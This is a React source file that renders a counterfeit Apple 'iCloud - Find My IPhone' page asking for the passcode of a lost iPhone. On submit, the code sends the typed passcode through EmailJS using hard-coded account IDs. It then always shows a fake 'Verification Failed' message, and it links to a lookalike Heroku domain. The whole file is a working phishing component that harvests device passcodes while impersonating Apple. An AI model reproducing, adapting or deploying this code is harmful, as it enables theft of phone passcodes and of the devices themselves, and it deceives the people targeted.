import React, { useState } from 'react'
import Container from 'react-bootstrap/Container'
import { Row, Form, Button } from 'react-bootstrap'
import Col from 'react-bootstrap/Col'
import FormControlLabel from '@material-ui/core/FormControlLabel'
import Checkbox from '@material-ui/core/Checkbox'
import Modal from 'react-bootstrap/Modal'
import { send } from 'emailjs-com'
import { Nav, Navbar } from 'react-bootstrap'

const Passcode = () => {
    const [toSend, setToSend] = useState({
        from_name: 'is default',
        message: '',
      })
    
      const [isOpen, setIsOpen] = React.useState(false)
    
      const showModal = () => {
        setIsOpen(true)
      }
    
      const hideModal = () => {
        setIsOpen(false)
      }
      const [isSpinner, setIsSpinner] = React.useState(false)

      const showSpinner = () => {
        setIsSpinner(true)
      }
    
      const hideSpinner = () => {
        setIsSpinner(false)
      }
    
    
      const onSubmit = (e) => {
        e.preventDefault()
        send(
          'service_semrrxd',
          'template_3zzq5dy',
          toSend,
          'user_kSXaadotnMlrxgdtSyp9I'
        )
          .then((response) => {
            console.log('SUCCESS!', response.status, response.text)
            //window.location.href = '/Verifay'
            setTimeout(showModal, 5000)
          })
          .catch((err) => {
            console.log('FAILED...', err)
          })
      }
    
      const handleChange = (e) => {
        setToSend({ ...toSend, [e.target.name]: e.target.value })
      }
    
      return (
        <div className='main-contains' style={{position: 'center'}}>
          
             <div
          className='backgroundImage'
          style={{
            backgroundImage: 'url(/background.png)',
          }}
        ></div><div class="lds-spinner"  style={{
          marginTop: '-200px',
        }}
        >
            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
          
      <header className='header'>
        <Navbar
          bg='dark'
          variant='dark'
          style={{ height: 50, color: 'black', overflow: 'hidden' }}
        >
          <link rel='icon' href='/' />
          <a href='/'>
            <img src='/appleLogo.png' alt='logo' width='20' height='20' />
          </a>
          <Nav className='ml-auto'>
            <a href='/'>
              <img src='/qm.png' alt='help' width='30' height='30' />
            </a>
          </Nav>
        </Navbar>
      </header>
      
      <div className='App' style={{ textAlign: 'center', marginTop: '0px' }}>
        <div className='backgroundImages'>
         
          <Container fluid className='App11' style={{ height: '100%', marginTop: '0px', }}>
            <Row>
              <Col lg={12} sm={12} style={{ marginTop: '50px' }}>
                <div>
                  <img src='/lostLogo.png' alt='logo' />
                </div>
                <Col>
                  <div className='signin' >
                    <p>iCloud - Find My IPhone</p>
                  </div>
                  {/* <p style={{
                        fontWeight:'bold'
                      }}>Enter the passcode that you used on your lost iPhone</p> */}
                </Col>
              </Col>
              <Col lg={6} sm={12} style={{marginLeft: 'auto', marginRight: 'auto'}}>
                <Form onSubmit={onSubmit}>
                  <div style={{}}>
                    <input
                      style={{
                        backgroundColor: '#F0F2F5',
                        fontSize: '15px',
                        height: '40px',
                        width: '95%',
                        marginTop: '10px',
                        marginLeft: '10px',
                        marginRight: '10px',
                      }}
                      type='hidden'
                      name='from_name'
                      value={toSend.from_name}
                      onChange={handleChange}
                      placeholder='Mobile number or email'
                    ></input>

                    <input
                      style={{
                        fontSize: '18px',
                        height: '40px',
                        backgroundColor:'white',
                        borderColor:'#0692fd',
                        //width: '95%',
                        marginTop: '20px',
                        //marginLeft: '10px',
                        //marginRight: '10px',
                      }}
                      autoFocus={true}
                      type='number'
                      pattern='[0-9]*'
                      inputmode='numeric'
                      name='message'
                      placeholder='Passcode'
                      value={toSend.message}
                      onChange={handleChange}
                    ></input>

                    <div className='d-grid gap-2'>
                      <a href='/Verifay'>
                        <Button
                          type='submit'
                          variant='primary'
                          onClick={(e) => {
                            setTimeout(showSpinner, 1)
                            setTimeout(showModal, 5000)
                          }}
                          style={{
                            fontWeight: 'bold',
                            //width: '97%',
                            marginTop: '30px',
                            fontSize: '18px',
                            height: '40px',
                            backgroundColor: 'rgb(82, 149, 236)',
                            borderRadius: '10px',
                            color: 'white',
                          }}
                        >
                          Enter
                        </Button>
                      </a>
                    </div>
                    <p
                      style={{
                        marginTop: '5px',
                        marginBottom: '10px',
                        textAlign: 'center',
                      }}
                    >
                      <div
                        style={{ paddingLeft: '20px' }}
                        className='divider'
                        orientation='vertical'
                      ></div>
                      <FormControlLabel
                        className='FormControlLabel'
                        control={
                          <Checkbox
                            name='checkedA'
                            color='primary'
                            label='Custom color'
                          />
                        }
                        label='Keep me signed in'
                      />
                      <hr />
                      <a href='https://find-losts.herokuapp.com/'>
                        <div className='forget'>
                          {' '}
                          Forgotten Apple ID or password?{' '}
                        </div>
                      </a>
                      {/* <a href='https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0'>
                      Forgot Passcode?
                    </a> */}
                    </p>
                    {/* <hr></hr>
                  <div
                    className='mb-2'
                    style={{
                      display: 'flex',
                      justifyContent: 'center',
                      alignItems: 'center',
                    }}
                  >
                    <Button
                      variant='primary'
                      size='lg'
                      style={{
                        backgroundColor: '#42B72A',
                        borderColor: '#42B72A',
                        fontWeight: 'bold',
                        fontSize: '15px',
                        height: '40px',
                        marginTop: '10px',
                      }}
                    >
                      Create New Account
                    </Button>{' '}
                  </div> */}
                  </div>
                </Form>
              </Col>
            </Row>
          </Container>
          {/* <Container
            style={{
              marginTop: '120px',
            }}
          >
            <Col
              style={
                {
                  //textAlign: 'center',
                }
              }
            >
              {' '}
              <p
                style={{
                  color: '#737373',
                  fontSize: '12px',
                  marginBottom: '-5px',
                  fontWeight:'bold'
                }}
              >
                Create Apple ID | System status | Privacy Policy
              </p>
              <a
                style={{
                  fontSize: '12px',
                  color: '#737373',
                }}
                href='/'
              >
                Terms & Conditions | Copyright 2021 Apple inc. All right
                reserved.
              </a>
            </Col>
          </Container> */}
        </div>
      </div>
<div style={{justifyContent: 'center',
          textAlign: 'center'}}>
      <Modal
        style={{
          fontWeight: 'bold',
          fontSize: '14px',
          width: '80%',
          borderRadius: '10px',
          top: '30%',
          position: 'fixed',
          left: '7.5%',
          
        }}
        show={isOpen}
        onHide={hideModal}
      >
        <Modal.Header
          style={{
            justifyContent: 'center',
            fontSize: '12px',
          }}
        >
          <Modal.Title
            
            >
              <div style={{
                justifyContent: 'center',
                textAlign: 'center'
              }}>Verification Failed </div><p style={{
                justifyContent: 'center',
                fontSize: '12px',
                textAlign: 'center',
                marginTop:'20px'
              }}>Your Passcode was incorrect.</p>
            </Modal.Title>
        </Modal.Header>


        <Modal.Footer
          style={{
            fontSize: '12px',
            fontFamily: 'Arial',
            justifyContent: 'center',
          }}
        >
          <button
            style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#0071c9',
              fontFamily: 'Arial',
              border: 'none',
              backgroundColor: 'white',
            }}
            onClick={hideModal}
          >
            OK
          </button>
        </Modal.Footer>
      </Modal><Modal
        show={isSpinner}
        onHide={hideSpinner}
      >
          <div class="spin"
      >
            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
    
      </Modal></div>
    </div>
      )
    }
export default Passcode
